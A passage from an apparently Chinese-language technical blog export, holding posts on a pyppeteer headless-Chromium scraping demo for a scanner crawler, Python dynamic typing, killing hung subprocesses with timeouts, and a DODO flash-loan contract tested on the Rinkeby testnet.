<blockquote>
<p>在去年，puppeteer和Chromium项目在经历了不断迭代后，新增了一些关键功能，Headless模式现在已经能大致胜任扫描器爬虫的任务。</p>
<p>所以我们在去年果断更新了扫描器的动态爬虫，采用Chromium的Headless模式作为网页内容解析引擎<br>—-<a href="https://www.anquanke.com/post/id/178339">漏扫动态爬虫实践</a></p>
</blockquote>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><ul>
<li><code>Chrome</code>的Headless模式早期不成熟</li>
<li><code>PhantomJS</code>不再维护了</li>
<li><code>puppeteer</code>和<code>Chromium</code>项目在不断迭代更新</li>
</ul>
<p>综上,就决定使用<code>pyppeteer</code>+<code>Chromium headless</code>这个搭配方案了.</p>
<p>那么,现在就跑个Demo来试试水.(参考<a href="https://medium.com/z1digitalstudio/pyppeteer-the-snake-charmer-f3d1843ddb19">Pyppeteer, the snake charmer</a>)</p>
<hr>
<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo:"></a>Demo:</h1><blockquote>
<p>原文章里的代码基本可以运行.<br>就是<code>url</code>和需要提取信息的<code>xpath</code>发送了一些变化.稍作修改即可</p>
</blockquote>
<hr>
<h2 id="静态爬虫"><a href="#静态爬虫" class="headerlink" title="静态爬虫:"></a>静态爬虫:</h2><p>先用最原始的方式,确认能够获取得到信息.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/5/18 11:32 PM</span></span><br><span class="line"><span class="comment"># @Author  : Jerry</span></span><br><span class="line"><span class="comment"># @Desc    : </span></span><br><span class="line"><span class="comment"># @File    : pyppeteer1.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">import</span> lxml.html</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">return</span> request.urlopen(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_document</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">return</span> response.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">document</span>):</span><br><span class="line">    <span class="comment"># Generate document tree</span></span><br><span class="line">    tree = lxml.html.fromstring(document)</span><br><span class="line">    <span class="comment"># Select tr with a th and td descendant from table</span></span><br><span class="line">    elements = tree.xpath(<span class="string">&#x27;//*[@id=&quot;mw-content-text&quot;]/div/table[1]/tbody/tr[th and td]&#x27;</span>)</span><br><span class="line">    <span class="comment"># Extract data</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">        th, td = element.iterchildren()</span><br><span class="line">        result.update(&#123;</span><br><span class="line">            th.text_content(): td.text_content()</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    languages = &#123;</span><br><span class="line">        <span class="string">&quot;python&quot;</span>: <span class="string">&quot;https://en.wikipedia.org/wiki/Python_(programming_language)&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;Rust&quot;: &quot;https://es.wikipedia.org/wiki/Rust_(lenguaje_de_programaci%C3%B3n)&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;Java&quot;: &quot;https://es.wikipedia.org/wiki/Java_(lenguaje_de_programaci%C3%B3n)&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;Javascript&quot;: &quot;https://es.wikipedia.org/wiki/JavaScript&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> name, url <span class="keyword">in</span> languages.items():</span><br><span class="line">        response = get_page(url)</span><br><span class="line">        document = read_document(response)</span><br><span class="line">        result.update(&#123;name: extract_data(document)&#125;)</span><br><span class="line"></span><br><span class="line">    pprint.pprint(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>预期结果:</p>
<p><img src="https://i.loli.net/2019/05/19/5ce1767fb20d290774.png"></p>
<hr>
<h2 id="puppeteer"><a href="#puppeteer" class="headerlink" title="puppeteer:"></a>puppeteer:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/5/18 11:32 PM</span></span><br><span class="line"><span class="comment"># @Author  : Jerry</span></span><br><span class="line"><span class="comment"># @Desc    : </span></span><br><span class="line"><span class="comment"># @File    : pyppeteer1.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_browser</span>():  <span class="comment"># 启动浏览器</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> launch(&#123;<span class="string">&quot;headless&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">browser, url</span>):</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(url)</span><br><span class="line">    <span class="keyword">return</span> page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">browser, name, url</span>):</span><br><span class="line">    page = <span class="keyword">await</span> get_page(browser, url)</span><br><span class="line">    <span class="keyword">return</span> &#123;name: <span class="keyword">await</span> extract_data(page)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">page</span>):  <span class="comment"># 数据提取</span></span><br><span class="line">    <span class="comment"># Select tr with a th and td descendant from table</span></span><br><span class="line">    elements = <span class="keyword">await</span> page.xpath(</span><br><span class="line">        <span class="string">&#x27;//*[@id=&quot;mw-content-text&quot;]/div/table[1]/tbody/tr[th and td]&#x27;</span>)</span><br><span class="line">    <span class="comment"># Extract data</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">        title, content = <span class="keyword">await</span> page.evaluate(</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;(element) =&gt;</span></span><br><span class="line"><span class="string">                [...element.children].map(child =&gt; child.textContent)&#x27;&#x27;&#x27;</span>,</span><br><span class="line">            element)</span><br><span class="line">        result.update(&#123;title: content&#125;)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">languages</span>):  <span class="comment"># 程序入口</span></span><br><span class="line">    browser = <span class="keyword">await</span> get_browser()  <span class="comment"># 启动浏览器</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> name, url <span class="keyword">in</span> languages.items():</span><br><span class="line">        result.update(<span class="keyword">await</span> extract(browser, name, url))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    languages = &#123;</span><br><span class="line">        <span class="string">&quot;python&quot;</span>: <span class="string">&quot;https://en.wikipedia.org/wiki/Python_(programming_language)&quot;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    result = loop.run_until_complete(extract_all(languages))</span><br><span class="line"></span><br><span class="line">    pprint.pprint(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同样能够获取到和预期一样的结果</p>
<hr>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结:"></a>总结:</h1><p>从Demo出发,再不断改进优化功能.<br>便能慢慢有些雏形出来了.<br>Keeo Moving.</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.anquanke.com/post/id/178339">漏扫动态爬虫实践</a></li>
<li><a href="https://antoinevastel.com/crawler/2018/09/17/simple-crawler-puppeteer.html">A simple crawler using Chrome headless with Puppeteer</a></li>
<li><a href="https://medium.com/z1digitalstudio/pyppeteer-the-snake-charmer-f3d1843ddb19">Pyppeteer, the snake charmer</a></li>
<li><a href="https://miyakogi.github.io/pyppeteer/">Pyppeteer文档</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-dynamic typing</title>
    <url>//64499.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><h2 id="Question1"><a href="#Question1" class="headerlink" title="Question1:"></a>Question1:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">type</span>(a)</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>我们并没有显示声明<code>a</code>是个变量而且它的类型为<code>int</code></p>
<p>那么python是怎么知道<code>a</code>是个变量而且知道它的类型的呢?</p>
<hr>
<h2 id="Question2"><a href="#Question2" class="headerlink" title="Question2:"></a>Question2:</h2><p>执行以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;string&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>

<p>a 的类型怎么发生了变化?</p>
<hr>
<p>以上2个问题涉及到python的一个重要的概念:<strong>动态类型(dynamic typing)</strong></p>
<p>要搞清楚动态类型之前要先搞清楚3个重要的概念及其关系:</p>
<ul>
<li>Object 对象</li>
<li>Reference 引用</li>
<li>Variable 变量</li>
</ul>
<hr>
<h1 id="三个重要的概念"><a href="#三个重要的概念" class="headerlink" title="三个重要的概念:"></a>三个重要的概念:</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object:"></a>Object:</h2><p>对象是我们分配的内存块,有足够的空间去存储数据.</p>
<p>所以<code>dict</code>、<code>list</code>、<code>string</code>这些对象在内存中都是一段01序列</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7188bb7d.jpg"></p>
<p>除了告诉解释器它是多少位后,它还要声明类型.</p>
<p>所以每个对象都有一个标准头部信息:类型标识符<code>type designator</code>来表示对象的类型.</p>
<hr>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h2><p>由于我们不能直接接触到存在内存中的对象,能操作的是变量名,所以我们要将变量和对象建立一个关系:引用<code>reference</code></p>
<p>python的引用跟C语言的指针很像,因为引用就是用指针实现的.</p>
<hr>
<h2 id="Variable"><a href="#Variable" class="headerlink" title="Variable:"></a>Variable:</h2><p>建立引用关系之后,我们就可以用变量名来操控对象了.</p>
<p>所以,变量是对对象的引用的一个符号名。</p>
<hr>
<h2 id="三者的关系"><a href="#三者的关系" class="headerlink" title="三者的关系:"></a>三者的关系:</h2><p>变量和对象存储在内存的不同部分中,并链接了起来(由指针).</p>
<p>实际就是,执行一个赋值语句的时候,python会做三件事:</p>
<ol>
<li>创建一个<code>对象</code>代表数值3</li>
<li>创建一个<code>变量名a</code></li>
<li>将<code>对象3</code>和<code>变量a</code>关联起来</li>
</ol>
<p><img src="https://i.loli.net/2019/04/25/5cc1d71989d84.jpg"></p>
<hr>
<h1 id="共享引用"><a href="#共享引用" class="headerlink" title="共享引用"></a>共享引用</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/04/25/5cc1d71a328d9.jpg"></p>
<p>多个变量名同时指向同一个对象,称为共享引用<code>Shared References</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;spam&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/04/25/5cc1d71adac08.jpg"></p>
<p><code>变量a</code> 改变了指向，指向到了<code>&#39;spam&#39;对象</code></p>
<p>而<code>变量b</code>还是指向原来的<code>3对象</code>,所以值没有改变</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li>《Studing Learning Python》</li>
<li><a href="https://realpython.com/python-variables/">Variables in Python</a></li>
<li><a href="http://www.cnblogs.com/vamei/archive/2012/07/10/2582795.html">Python进阶09 动态类型</a></li>
<li><a href="https://www.youtube.com/watch?v=OE2j6hlU88o&t=2s">Dynamic Typing in Python</a></li>
<li><a href="https://eli.thegreenplace.net/2012/03/30/python-objects-types-classes-and-instances-a-glossary">Python objects, types, classes, and instances - a glossary</a></li>
</ul>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-杀死subprocess进程</title>
    <url>//7012.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在整合第三方工具的时候,我们常常会用<code>subprocess</code>库来调用可执行文件.</p>
<p>一般情况下,我们会等待这个命令的结束.</p>
<p>但有时候第三方工具会因为特殊情况而卡死,从而导致整个程序卡死.</p>
<p>此时,我们可以设置一个最大的超时时间.</p>
<p>当这个命令超过这个最大时间的时候,我们主动kill掉,以保证程序接下来可以正常运行.</p>
<hr>
<h1 id="py3"><a href="#py3" class="headerlink" title="py3:"></a>py3:</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = subprocess.Popen([cmd],stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    (stdoutput, erroutput) = p.communicate(timeout=TIMEOUT)  <span class="comment"># 超时时间</span></span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    p.kill()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] TIMEOUT: %s&quot;</span> % cmd)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>py3的<code>subprocess</code>库原生支持了超时时间的参数.</p>
<p>过了超时时间的时候,会抛出<code>TimeoutExpired</code>异常.我们只需要<code>catch</code>到再做处理就行了.</p>
<hr>
<h1 id="py2"><a href="#py2" class="headerlink" title="py2:"></a>py2:</h1><p>没想到py2的<code>subprocess</code>库还并没有支持<code>timeout</code>参数.只能自己手动计时.到时间kill掉.</p>
<p>搜索到的实现比较好的示例代码,只需要简单改改就可以用了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Timer</span><br><span class="line"> </span><br><span class="line">kill = <span class="keyword">lambda</span> process: process.kill()</span><br><span class="line">cmd = [<span class="string">&#x27;ping&#x27;</span>, <span class="string">&#x27;www.google.com&#x27;</span>]</span><br><span class="line">ping = subprocess.Popen(</span><br><span class="line">    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"> </span><br><span class="line">my_timer = Timer(<span class="number">5</span>, kill, [ping])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    my_timer.start()</span><br><span class="line">    stdout, stderr = ping.communicate()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    my_timer.cancel()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="另一种卡死的情况"><a href="#另一种卡死的情况" class="headerlink" title="另一种卡死的情况:"></a>另一种卡死的情况:</h1><blockquote>
<p>原因是使用<code>Popen.wait()</code>后直接读<code>PIPE.stdout.read()</code>之前，可能缓存已经满了，此时导致了卡死。</p>
<p>解决办法：使用<code>communicate()</code>,这个方法会把输出放在内存，而不是管道里，所以这时候上限就和内存大小有关了，一般不会有问题。</p>
</blockquote>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.blog.pythonlibrary.org/2016/05/17/python-101-how-to-timeout-a-subprocess/">Python 101: How to timeout a subprocess</a></li>
<li><a href="https://www.cnblogs.com/chybot/p/5176118.html">python Popen卡死问题</a></li>
<li><a href="https://www.cnblogs.com/sueris/p/6235861.html">Python subprocess.Popen communicate() 和wait()使用上的区别</a></li>
</ul>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Programming</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-DoDoFlashLoan测试网例子</title>
    <url>//33960.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>DoDo支持flash loan,并且手续费上比较友好</p>
<blockquote>
<p>注：DODO V2 闪电贷仅当返还的base quote 数量比例产生变化时，合约会预览一笔将base quote 磨平的交易，该磨平交易手续费作为闪电贷手续费。其他情况不收取手续费用</p>
</blockquote>
<p>试试在<code>rinkby</code>测试网上能否执行借款还款操作</p>
<h1 id="DoDo闪电交换机制"><a href="#DoDo闪电交换机制" class="headerlink" title="DoDo闪电交换机制:"></a>DoDo闪电交换机制:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226162909.png" alt="20220226162909"></p>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h1><h2 id="solidity代码"><a href="#solidity代码" class="headerlink" title="solidity代码:"></a>solidity代码:</h2><p>参考文档里<a href="https://dodoex.github.io/docs/zh/docs/flashSwap">闪电交换</a>，有代码例子<br>该代码则是只实现了借款和还款的操作，具体的借款后的操作逻辑还要自己实现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./interface/IDODO.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./interface/Withdraw.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Flashloan</span> is <span class="title class_">Withdraw</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">dodoFlashLoan</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address flashLoanPool, <span class="comment">//You will make a flashloan from this DODOV2 pool</span></span></span><br><span class="line"><span class="params">        uint256 loanAmount, </span></span><br><span class="line"><span class="params">        address loanToken</span></span><br><span class="line"><span class="params">    </span>) external  &#123;</span><br><span class="line">        <span class="comment">//Note: The data can be structured with any variables required by your logic. The following code is just an example</span></span><br><span class="line">        bytes memory data = abi.<span class="title function_">encode</span>(flashLoanPool, loanToken, loanAmount);</span><br><span class="line">        address flashLoanBase = <span class="title function_">IDODO</span>(flashLoanPool).<span class="title function_">_BASE_TOKEN_</span>();</span><br><span class="line">        <span class="keyword">if</span>(flashLoanBase == loanToken) &#123;</span><br><span class="line">            <span class="title function_">IDODO</span>(flashLoanPool).<span class="title function_">flashLoan</span>(loanAmount, <span class="number">0</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">IDODO</span>(flashLoanPool).<span class="title function_">flashLoan</span>(<span class="number">0</span>, loanAmount, <span class="title function_">address</span>(<span class="variable language_">this</span>), data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Note: CallBack function executed by DODOV2(DVM) flashLoan pool</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DVMFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount,bytes calldata data</span>) external &#123;</span><br><span class="line">        <span class="title function_">_flashLoanCallBack</span>(sender,baseAmount,quoteAmount,data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Note: CallBack function executed by DODOV2(DPP) flashLoan pool</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DPPFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data</span>) external &#123;</span><br><span class="line">        <span class="title function_">_flashLoanCallBack</span>(sender,baseAmount,quoteAmount,data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Note: CallBack function executed by DODOV2(DSP) flashLoan pool</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DSPFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data</span>) external &#123;</span><br><span class="line">        <span class="title function_">_flashLoanCallBack</span>(sender,baseAmount,quoteAmount,data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_flashLoanCallBack</span>(<span class="params">address sender, uint256, uint256, bytes calldata data</span>) internal &#123;</span><br><span class="line">        (address flashLoanPool, address loanToken, uint256 loanAmount) = abi.<span class="title function_">decode</span>(data, (address, address, uint256));</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(sender == <span class="title function_">address</span>(<span class="variable language_">this</span>) &amp;&amp; msg.<span class="property">sender</span> == flashLoanPool, <span class="string">&quot;HANDLE_FLASH_NENIED&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Note: Realize your own logic using the token from flashLoan pool.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Return funds</span></span><br><span class="line">        <span class="title class_">IERC20</span>(loanToken).<span class="title function_">transfer</span>(flashLoanPool, loanAmount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="brownie"><a href="#brownie" class="headerlink" title="brownie"></a>brownie</h2><p>部署脚本:</p>
<p><code>brownie run scripts/deployment.py --network rinkeby</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> Flashloan, accounts, config, network</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Deploy a `Flashloan` contract from `accounts[0]`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    acct = accounts.add(</span><br><span class="line">        config[<span class="string">&quot;wallets&quot;</span>][<span class="string">&quot;from_key&quot;</span>]</span><br><span class="line">    )  <span class="comment"># add your keystore ID as an argument to this call</span></span><br><span class="line"></span><br><span class="line">    flashloan = Flashloan.deploy(&#123;<span class="string">&quot;from&quot;</span>: acct&#125;)</span><br><span class="line">    <span class="keyword">return</span> flashloan</span><br></pre></td></tr></table></figure>

<p>执行脚本</p>
<p><code>brownie run scripts/run_flash_loan.py --network rinkeby</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> Flashloan, accounts, config, network, interface</span><br><span class="line"></span><br><span class="line">ETHERSCAN_TX_URL = <span class="string">&quot;https://rinkeby.etherscan.io/tx/&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Executes the funcitonality of the flash loan.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    acct = accounts.add(config[<span class="string">&quot;wallets&quot;</span>][<span class="string">&quot;from_key&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Getting Flashloan contract...&quot;</span>)</span><br><span class="line">    flashloan = Flashloan[<span class="built_in">len</span>(Flashloan) - <span class="number">1</span>]</span><br><span class="line">    usdc = interface.IERC20(config[<span class="string">&quot;networks&quot;</span>][network.show_active()][<span class="string">&quot;usdc&quot;</span>])</span><br><span class="line"></span><br><span class="line">    balance = usdc.balanceOf(acct) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Executing Flashloan...&quot;</span>)</span><br><span class="line">    tx = flashloan.dodoFlashLoan(<span class="string">&quot;0x446Bb563EEC2E5C439f5b94C6DaAebcCF5d2F99C&quot;</span>,<span class="number">10000000</span>,<span class="string">&quot;0xab0733588776B8881F7712f6AbCa98F510e6B63D&quot;</span>,  &#123;<span class="string">&quot;from&quot;</span>: acct, <span class="string">&quot;gas_limit&quot;</span>:<span class="string">&quot;5074044&quot;</span>, <span class="string">&quot;allow_revert&quot;</span>:<span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You did it! View your tx here: &quot;</span> + ETHERSCAN_TX_URL.<span class="built_in">format</span>(tx.txid))</span><br><span class="line">    <span class="keyword">return</span> flashloan</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果:"></a>执行效果:</h2><p><a href="https://rinkeby.etherscan.io/tx/0xbc67ada4c2d570f8aba40cae4bd47794d9f25f4969b72792b30d2e23f0c8481b">tx</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226164550.png" alt="20220226164550"></p>
<p>能成功借款还款</p>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题:"></a>遇到的问题:</h1><p>dodoFlashLoan函数有3个参数:</p>
<ul>
<li>flashLoanPool 池子地址</li>
<li>loanAmount 数量</li>
<li>loanToken 要借的token地址</li>
</ul>
<h2 id="选择池子地址"><a href="#选择池子地址" class="headerlink" title="选择池子地址:"></a>选择池子地址:</h2><p>在<code>https://app.dodoex.io/pool/list?network=rinkeby</code>可以看到有哪些池子信息</p>
<p>比如此处我要借usdc，就可以搜索一下</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226161537.png" alt="20220226161537"></p>
<p>然后该池子还要支持flashloan，比如上图第一个池子就不支持，第二个池子才支持</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226161948.png" alt="20220226161948"></p>
<h2 id="借款数量"><a href="#借款数量" class="headerlink" title="借款数量"></a>借款数量</h2><p>一开始我填的<code>loanAmount</code>为10 ether,想借10个，转换成wei则为<code>10000000000000000000</code><br>执行后报错，无法正常借款还款</p>
<p>查一下报错<br><code>https://dashboard.tenderly.co/tx/rinkeby/0xee7f3a6e0ef5906f8f95cbc789151e1d62da424dc80c6d93c80307ba060be646</code></p>
<p><code>Error Message:ERC20: transfer amount exceeds balance</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226162947.png" alt="20220226162947"></p>
<p>对比一下Dodo流程，此时池子在借款的时候，要发送token给我合约时报错了，报错信息为转账数量超过余额了。</p>
<p>减少<code>loanAmount</code>为<code>10000000</code>后，发现能成功，原来该usdc的精度为6位</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220226163700.png" alt="20220226163700"></p>
<p>以后要注意一下，大多数代币的精度为18位，但有些代币不是。</p>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://dodoex.github.io/docs/zh/docs/flashSwap">闪电交换</a></li>
<li><a href="https://github.com/yuichiroaoki/poly-flash/blob/main/test/dodoflash.test.ts">https://github.com/yuichiroaoki/poly-flash/blob/main/test/dodoflash.test.ts</a></li>
<li><a href="https://medium.com/coinmonks/no-flashloan-fee-with-dodo-cc78215d7f93">No Flashloan Fee with DODO</a></li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Solidity</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-Erc20区分买卖_添加移除流动性行为</title>
    <url>//14814.html</url>
